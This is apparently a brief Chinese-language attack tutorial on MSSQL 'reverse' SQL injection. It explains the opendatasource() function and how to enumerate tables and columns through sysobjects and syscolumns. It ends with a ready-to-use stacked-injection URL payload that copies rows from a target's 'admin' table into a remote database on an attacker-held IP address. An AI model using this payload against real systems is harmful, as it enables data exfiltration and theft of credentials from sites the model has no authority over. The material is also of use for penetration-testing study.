# mssql反弹注入

> 使用mssql独有的函数opendatasource()将查询结果插入到自己的公网数据库；

## mssql opendatasource()函数用法

```sql
opendatasource('sqloledb','server=公网地址,端口;uid=用户名;pwd=密码;database=库名')
```
该函数作用是打开远程数据源连接

## mssql获取表名

```
select id,name from sysobjects where xtype='U' -- xtype U是用户表 S是系统表
```
### sysobjects.xtype值的含义
> C = CHECK 约束  
D = 默认值或 DEFAULT 约束  
F = FOREIGN KEY 约束  
L = 日志  
FN = 标量函数  
IF = 内嵌表函数  
P = 存储过程  
PK = PRIMARY KEY 约束（类型是 K）  
RF = 复制筛选存储过程  
S = 系统表  
TF = 表函数  
TR = 触发器  
U = 用户表  
UQ = UNIQUE 约束（类型是 K）  
V = 视图  
X = 扩展存储过程

## mssql获取字段名
```
select * from syscolumns where id=581577110 -- (表的id)
```

## 堆叠注入执行insert语句

```sql
https://api.xxx.com/getUserInfo?id=1;insert into opendatasource('sqloledb','server=123.123.123.123,1433;uid=test;pwd=123456;database=db1').db1.dbo.table1 (col1,col2) select col1,col2 from admin;
```
